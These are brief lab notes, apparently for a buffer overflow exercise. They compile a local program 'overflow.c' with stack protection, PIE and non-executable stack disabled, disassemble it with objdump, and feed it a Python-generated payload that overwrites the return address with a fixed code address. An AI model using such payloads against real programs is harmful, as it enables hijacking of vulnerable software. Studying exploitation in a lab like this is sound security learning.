to compile (removes guards to make it less secure):  
gcc -m32 -fno-stack-protector -no-pie -fno-pic -z execstack overflow.c -o overflow  
  
objdump:  
objdump -d -Mintel ./overflow | less  

to exploit buffer overflow:  
(python3 -c "import sys;sys.stdout.buffer.write(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCDDDD\x86\x91\x04\x08')" && cat) | ./overflow  

